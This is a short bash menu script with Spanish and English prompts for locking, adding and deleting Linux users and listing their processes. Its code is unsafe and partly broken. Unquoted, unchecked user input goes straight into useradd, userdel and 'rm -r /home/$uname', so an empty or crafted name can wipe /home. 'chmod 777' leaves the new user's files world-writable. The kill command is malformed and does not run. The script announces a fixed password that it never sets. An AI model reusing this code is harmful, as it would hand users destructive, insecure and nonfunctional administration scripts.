lockkill()
{
#!/bin/bash
clear
echo "+=================================+"
echo "+---------------------------------+"
echo " +       Lista de Priority       + "
echo " +                               + "
echo " +-------------------------------+ "
echo "Ingresa un User: "
read uname
passwd -l $uname
kill -9 ps -u $uname -o "pid="
echo "Presiona una Tecla"
read
}

adduser()
{
#!/bin/bash
clear
echo "+=================================+"
echo "+---------------------------------+"
echo " +   Ingresa un Nuevo usuario    + "
echo " +                               + "
echo " +-------------------------------+ "
echo " "
echo "Nuevo usuario: "
read uname
useradd $uname
mkdir /home/$uname
cp /home/gott/start /home/$uname/menu
passwd $uname 
cd /home/$uname
chmod 777 *
echo "Usuario Añadido, Contraseña: GoTT"
echo "presiona una Tecla"
read
}

deluser()
{
#!/bin/bash
clear
echo "+=================================+"
echo "+---------------------------------+"
echo " +           Remove User         + "
echo " +                               + "
echo " +-------------------------------+ "
echo " "
echo "Nombre a Remover: "
read uname
userdel $uname
rm -r /home/$uname
echo "User removed"
echo "presiona una Tecla"
read
}

lstprocesses()
{
#!/bin/bash
clear
echo "+=================================+"
echo "+---------------------------------+"
echo " +      List User Processes      + "
echo " +                               + "
echo " +-------------------------------+ "
echo "Ingresa un User: "
read uname
ps aux | grep -i $uname
echo "Presiona una Tecla"
read
}

